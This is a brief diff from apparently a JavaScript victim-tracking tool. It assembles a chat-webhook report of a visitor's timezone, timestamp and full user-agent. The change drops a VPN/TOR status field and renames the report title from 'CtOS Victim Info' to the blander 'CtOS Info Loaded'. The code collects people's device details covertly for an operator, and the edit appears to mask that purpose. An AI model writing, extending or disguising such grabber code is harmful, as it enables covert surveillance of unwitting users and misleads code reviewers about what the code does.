@@ -151,14 +151,13 @@
                     { name: 'Timezone', value: device.timezone || 'N/A', inline: true },
                     { name: 'Timestamp', value: device.timestamp || 'N/A', inline: false },
                     { name: 'Full User-Agent', value: device.userAgent || 'N/A', inline: false },
-                    { name: 'VPN/TOR Status', value: vpnTorStatus, inline: false }
                 ];
 
                 const payload = {
                     username: 'Bagley',
                     avatar_url: 'https://i.imgur.com/HsHtn2b.jpeg',
                     embeds: [{
-                        title: 'CtOS Victim Info',
+                        title: 'CtOS Info Loaded',
                         color: 0x00ff00,
                         fields: fields,
                         footer: { text: 'R3TRO' },
